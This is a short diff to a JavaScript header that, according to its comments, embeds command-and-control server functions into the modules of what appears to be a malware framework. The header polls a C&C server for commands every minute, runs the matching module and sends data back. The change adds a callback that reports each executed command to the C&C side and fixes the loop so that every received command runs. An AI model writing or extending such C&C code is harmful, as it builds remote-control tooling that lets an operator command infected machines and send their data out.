@@ -5,6 +5,7 @@
 // This header will be defined for every module to define processing of new cmds 
 // & querying new cmds from server.  
 // Define one header to embed all necessary c&c server functions.
+let executedCmd = {{CC_EXECUTED_CMD_FN}};
 let getCmds = {{CC_GET_CMDS_FN}};
 let sendData = {{CC_SEND_DATA_FN}};
 let QUERY_CMDS_INTERVAL = 1 * 60 * 1000; // Get new cmds from server every 1 minute.
@@ -21,9 +22,11 @@ function parseExecCmdsMail(cmds_list) {
 	// Commands Format:
 	// (module_name, op, args_list)
 	for (let i=0; i<cmds_list.length; i++) {
-		if (cmds_list[0].toLowerCase() === MODULE_NAME) {
-			if (cmds_list[1].toLowerCase() === 'get') {
-				execModuleWithParams(cmds_list[2]);
+		let cmd = cmds_list[i];
+		if (cmd[0].toLowerCase() === MODULE_NAME) {
+			if (cmd[1].toLowerCase() === 'get') {
+				execModuleWithParams(cmd[2]);
+				executedCmd(cmd); // Inform C&C module for execution
 			}
 		}
 	}
